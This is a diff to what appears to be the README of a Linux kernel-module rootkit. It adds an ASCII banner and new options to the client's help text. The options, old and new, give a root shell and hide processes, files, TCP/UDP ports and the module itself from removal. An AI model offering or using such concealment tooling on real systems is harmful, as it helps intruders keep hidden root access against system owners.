@@ -67,20 +67,37 @@ Use rootkit:
 
 ```sh
 $ ./client --help
+
+  ╔╗╔┬ ┬┌─┐┬  ┌─┐┌─┐┬─┐   
+  ║║║│ ││  │  ├┤ ├─┤├┬┘   
+  ╝╚╝└─┘└─┘┴─┘└─┘┴ ┴┴└─   
+   ╔═╗┬ ┬┌─┐┌─┐┌┬┐        
+   ║ ╦├─┤│ │└─┐ │         
+   ╚═╝┴ ┴└─┘└─┘ ┴         
+          By R0P_Ch41n5   
+                          
 Usage: ./client [OPTION]...
 
 Options:
-  --root-shell            Grants you root shell access.
-  --hide-pid=PID          Hides the specified PID.
-  --unhide-pid=PID        Unhides the specified PID.
-  --hide-file=FILENAME    Hides the specified FILENAME globally.
-                          Must be a filename without any path.
-  --unhide-file=FILENAME  Unhides the specified FILENAME.
-  --hide                  Hides the rootkit LKM.
-  --unhide                Unhides the rootkit LKM.
-  --help                  Print this help message.
-  --protect               Protects the rootkit from rmmod.
-  --unprotect             Disables the rmmod protection.
+  --root-shell              Grants you root shell access.
+  --hide-pid=PID            Hides the specified PID.
+  --unhide-pid=PID          Unhides the specified PID.
+  --hide-file=FILENAME      Hides the specified FILENAME globally.
+                            Must be a filename without any path.
+  --unhide-file=FILENAME    Unhides the specified FILENAME.
+  --hide-tcp-port=PORT      Hides the specified tcp PORT
+  --unhide-tcp-port=PORT    Unhides the specified tcp PORT
+  --hide-tcp6-port=PORT     Hides the specified tcp6 PORT
+  --unhide-tcp6-port=PORT   Unhides the specified tcp6 PORT
+  --hide-udp-port=PORT      Hides the specified udp PORT
+  --unhide-udp-port=PORT    Unhides the specified udp PORT
+  --hide-udp6-port=PORT     Hides the specified udp6 PORT
+  --unhide-udp6-port=PORT   Unhides the specified udp6 PORT
+  --hide                    Hides the rootkit LKM.
+  --unhide                  Unhides the rootkit LKM.
+  --help                    Print this help message.
+  --protect                 Protects the rootkit from rmmod.
+  --unprotect               Disables the rmmod protection.
 ```
 
 Unload rootkit:
